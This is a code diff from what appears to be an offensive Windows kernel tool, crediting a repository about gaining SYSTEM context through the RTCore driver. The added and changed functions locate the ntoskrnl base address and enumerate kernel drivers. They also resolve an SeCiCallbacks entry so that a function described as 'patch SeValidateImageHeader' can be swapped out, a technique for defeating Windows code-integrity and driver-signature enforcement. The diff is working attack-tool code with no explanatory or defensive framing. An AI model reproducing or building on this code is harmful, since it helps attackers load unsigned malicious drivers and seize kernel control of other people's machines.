@@ -11,11 +11,24 @@
 *
 * Params:
 *
-* _IN_ targetModuleName
+* Creds:
+* https://github.com/Offensive-Panda/NT-AUTHORITY-SYSTEM-CONTEXT-RTCORE
 */
 
-PVOID modules::EnumerateKernelModules( const std::wstring& targetModuleName )
-{
+void* modules::retr_ntos_base() {
+    DWORD out{ 0 };
+    DWORD nb{ 0 };
+    PVOID* base{ NULL };
+    std::printf( "[*] Enumerating Loaded Drivers...\n" );
+    if ( EnumDeviceDrivers( NULL, 0, &nb ) ) {
+        base = ( PVOID* )malloc( nb );
+        if ( EnumDeviceDrivers( base, nb, &out ) ) 
+            return ( void* )base[0];
+    } 
+    return { NULL };
+}
+
+PVOID modules::find_kernel_device( const std::wstring& targetModuleName ){
     constexpr DWORD maxDrivers = { 1024 };
     LPVOID drivers[maxDrivers];
     DWORD cbNeeded = { 0 };
@@ -35,27 +48,27 @@ PVOID modules::EnumerateKernelModules( const std::wstring& targetModuleName )
         if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {
 
             if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
-                std::printf( "[*] Kernel Base Addr Found: 0x%p\n", drivers[i] );
                 return drivers[i];
             }
-        } else
+        }
+        else
             std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
-    }   
+    }
     // Failed, just return false
-    return 0; 
+    return 0;
 }
-
 
 /*
 * get_CIValidate_ImageHeaderEntry
 *
 * Purpose:
-*
+*   
 * patch SeValidateImageHeader
 */
 
 seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
-    PVOID kModuleBase = modules::EnumerateKernelModules( L"ntoskrnl.exe" );
+    auto kModuleBase = modules::retr_ntos_base();
+    std::printf( "[*] Kernel base addr: 0x%p\n", kModuleBase );
 
     HMODULE uNt = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
 
@@ -89,9 +102,5 @@ seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
 
     return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushInstructionCache };
 }
-
-
-
-
 
 
